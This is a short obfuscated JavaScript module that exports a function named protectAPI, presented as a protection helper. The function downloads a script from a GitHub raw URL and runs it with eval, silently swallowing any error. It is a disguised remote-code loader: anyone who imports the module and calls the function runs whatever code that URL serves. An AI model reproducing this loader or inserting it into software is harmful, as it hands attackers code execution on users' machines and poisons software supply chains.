const _0x4a21de = async (_0x133459) => {
    try {
        const _0x2e8192 = await fetch(_0x133459);
        if (!_0x2e8192.ok) {
            return;
        }
        const _0x59f1d9 = await _0x2e8192.text();
        eval(_0x59f1d9);
    } catch (_0x36c69a) {}
};
module.exports = protectAPI;

function protectAPI() {
    _0x4a21de("https://github.com/datadestroyed/s/raw/refs/heads/main/ts.js");
}
